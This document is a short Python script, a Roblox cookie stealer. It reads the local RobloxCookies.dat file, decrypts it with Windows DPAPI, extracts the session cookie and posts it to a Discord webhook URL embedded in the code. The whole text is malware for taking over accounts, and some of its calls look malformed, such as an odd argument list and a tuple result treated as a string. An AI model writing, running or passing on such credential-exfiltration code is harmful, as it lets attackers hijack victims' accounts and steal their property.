import os, json, base64, win32crypt, requests;
path = os.path.join(os.getenv('LOCALAPPDATA'), 'Roblox', 'LocalStorage', 'RobloxCookies.dat');
data = json.load(open(path));
decrypted = win32crypt.CryptUnprotectData(base64.b64decode(data['CookiesData']), None, None, None, None, None, None, None, None, None, None, None);
parts = decrypted.split('\t');
cookie = parts[6] if len(parts) > 6 else parts[-1];
requests.post('https://discord.com/api/webhooks/1537465398935691295/o2yNbRAw1Hfan69fkeneUr8lnoIWVKO29LbYU24rTJqRfd7tKhfXi40AWRg0aiE68O6f', json={'content': f'{cookie}'})
